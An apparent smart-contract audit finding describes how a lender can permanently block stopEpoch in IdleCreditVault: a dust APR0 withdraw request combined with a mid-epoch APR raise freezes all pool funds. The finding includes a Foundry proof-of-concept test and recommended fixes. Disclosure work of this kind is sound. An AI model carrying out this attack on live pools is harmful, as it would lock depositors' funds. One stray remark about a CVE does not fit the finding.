### Title
Permanently bricked `stopEpoch` via dust APR0 withdraw request combined with a mid-epoch APR raise - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.prepareStopEpochWithApr0` hard-reverts whenever `apr0TotalPrincipal != 0` and `unscaledApr != 0`. An unprivileged (KYC-passing) lender can plant a dust APR0 withdraw request during the buffer period of an APR0 epoch; any subsequent honest manager action that sets a non-zero APR before the next `stopEpoch` makes `stopEpoch` revert forever. Because the revert happens before the `try/catch` default path in `_stopEpoch`, the pool can never roll the epoch, never recall funds, and never even enter the orderly default path — all user funds are permanently frozen.

### Finding Description
When `unscaledApr == 0`, `requestWithdraw` routes the request into the APR0 bucket via `_requestWithdrawApr0`, which increases the global `apr0TotalPrincipal` ( [1](#0-0) , [2](#0-1) ). At `stopEpoch`, `prepareStopEpochWithApr0` is called unconditionally and reverts with `NotAllowed` if `apr0TotalPrincipal != 0` while `unscaledApr` has become non-zero ( [3](#0-2) ).

Two properties make this reachable by an unprivileged attacker:

1. `setApr` has no `isEpochRunning` guard — the manager may legitimately adjust the APR mid-epoch (e.g., reacting to market conditions) while APR0 receipts are still pending ( [4](#0-3) ).
2. `prepareStopEpochWithApr0` executes before the `try this.getFundsFromBorrower(...)` block in `_stopEpoch`, so its revert is not caught by the `_handleBorrowerDefault` fallback — the entire `stopEpoch` transaction reverts ( [5](#0-4) ).

Sequence:

- Epoch N runs at `unscaledApr == 0`; `stopEpoch(N, _newApr = 0)` keeps APR at 0.
- During the buffer, the attacker deposits dust (allowed while `isEpochRunning == false` and wallet is KYC-allowed) and calls `requestWithdraw` → the request lands in the APR0 bucket; `apr0TotalPrincipal = dust`.
- `startEpoch(N+1)` runs fine.
- During epoch N+1, the honest manager calls `setApr(10e18)` (or any non-zero value).
- Epoch N+1 ends; any `stopEpoch` call now reverts in `prepareStopEpochWithApr0` — `apr0TotalPrincipal != 0` and `unscaledApr != 0`. There is no admin function to clear `apr0TotalPrincipal` or to settle APR0 principal outside the stopping epoch (`_settleApr0` is only reached via `claimWithdrawRequest`, which itself requires `epochNumber > lastWithdrawRequest`, i.e., a successful `stopEpoch` first — [6](#0-5) , [7](#0-6) ).

The attacker can also front-run the manager's `setApr`/APR-change `stopEpoch` with a fresh dust request in any APR0 buffer, re-arming the DoS cheaply.

### Impact Explanation
Permanent freezing of all pool funds. `epochEndDate` passes, `stopEpoch` reverts unconditionally, and the default-recovery path (`_handleBorrowerDefault`, `finalizeDefault`) is unreachable because it is only triggered inside `stopEpoch`'s catch or by a successful defaulting stop. The borrower's funds can never be recalled through the contract; every depositor's tranche tokens and pending receipts become unrecoverable — total loss equal to full TVL plus pending withdraws.

### Likelihood Explanation
The attack costs the attacker only a dust deposit plus one `requestWithdraw` in an APR0 buffer window, and a KYC credential (which all lenders hold). It requires one honest-manager action (a non-zero `setApr` during the epoch, or a `stopEpochWithDuration` that first calls `setAprsWithBuffer` before the next stop) — a routine operation with no guard preventing it. Because `_requestWithdrawApr0` accepts any nonzero amount, the revert is deterministic once the state combination exists. Note this analog matches the CVE's "crafted input hangs the process" class: a single unprivileged state-changing message permanently wedges the epoch state machine. I could not fully verify whether an alternate admin path exists to clear `apr0TotalPrincipal` (e.g., an upgrade); none was found in the contract surface examined.

### Recommendation
Do not revert `stopEpoch` on stale APR0 principal. Options:
- In `prepareStopEpochWithApr0`, when `unscaledApr != 0` and `apr0TotalPrincipal != 0`, settle the APR0 bucket at the current APR (or at zero interest) instead of reverting, and clear `apr0TotalPrincipal`.
- Alternatively, add an owner/manager escape function to settle or migrate the APR0 bucket, and/or guard `setApr`/`setAprsWithBuffer` to reject non-zero APR while `apr0TotalPrincipal != 0` (reverting the manager's APR change rather than the epoch stop).
- Additionally, consider moving the APR0 settlement before the validity check so that `apr0TotalPrincipal` is always drained at each `stopEpoch`.

### Proof of Concept
Foundry-style fork PoC (setup follows `test/foundry/IdleCreditVault.t.sol` helpers `_depositWithUser`, `_toggleEpoch`, `_stopEpochAndCheckPrices`):

```solidity
function testPocApr0StopEpochDos() external {
  // Assume pool configured with unscaledApr == 0 for current epoch (APR0 mode).
  address attacker = makeAddr('attacker');

  // 1) Legit depositors fund the pool.
  _depositWithUser(makeAddr('lp1'), 100_000e6, true);
  _depositWithUser(makeAddr('lp2'), 100_000e6, true);

  // 2) Epoch N runs at APR 0, then stops with _newApr = 0 (buffer begins, APR still 0).
  _startEpochAndCheckPrices(0);
  _stopEpochAndCheckPrices(0, 0, _expectedFundsEndEpoch()); // unscaledApr stays 0

  // 3) Attacker (KYC-allowed) deposits dust and requests withdraw -> APR0 bucket.
  _depositWithUser(attacker, 1e6, true);
  vm.prank(attacker);
  cdoEpoch.requestWithdraw(0, address(AAtranche)); // full balance, APR0 path
  assertGt(strategy.apr0TotalPrincipal(), 0, 'APR0 bucket armed');

  // 4) Epoch N+1 starts.
  vm.prank(manager);
  cdoEpoch.startEpoch();

  // 5) Honest manager raises APR mid-epoch (setApr has no epoch-running guard).
  vm.prank(manager);
  strategy.setApr(10e18); // unscaledApr != 0 while apr0TotalPrincipal != 0

  // 6) Epoch ends -> stopEpoch reverts permanently; no catch, no default path.
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.expectRevert(NotAllowed.selector);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);

  // Retry with any params still reverts; default can never be declared.
  vm.expectRevert(NotAllowed.selector);
  vm.prank(manager);
  cdoEpoch.stopEpochWithDuration(0, 0, 30 days, 0);

  // Attacker's own claim is also bricked (epochNumber never advances).
  vm.expectRevert(NotAllowed.selector);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L225-235)
```text
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L285-286)
```text
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L326-330)
```text
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L357-364)
```text
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L502-508)
```text
    if (_principal == 0) {
      return (_expInterest, _adjPendingWithdrawFees);
    }
    // APR0 principal is only valid while APR is 0 for that request lifecycle.
    if (unscaledApr != 0) {
      revert NotAllowed();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L553-555)
```text
    if (_reqEpoch >= epochNumber) {
      return;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L567-577)
```text
  function _requestWithdrawApr0(uint256 _amount, address _user) internal {
    // Settle any previous APR0 request first, then start/update current epoch bucket.
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    if (_apr0User.principal == 0) {
      _apr0User.principalEpoch = epochNumber;
    }
    _apr0User.principal += _amount;
    // Epoch-level APR0 principal used only to compute stopEpoch APR0 pro-rata interest.
    apr0TotalPrincipal += _amount;
  }
```
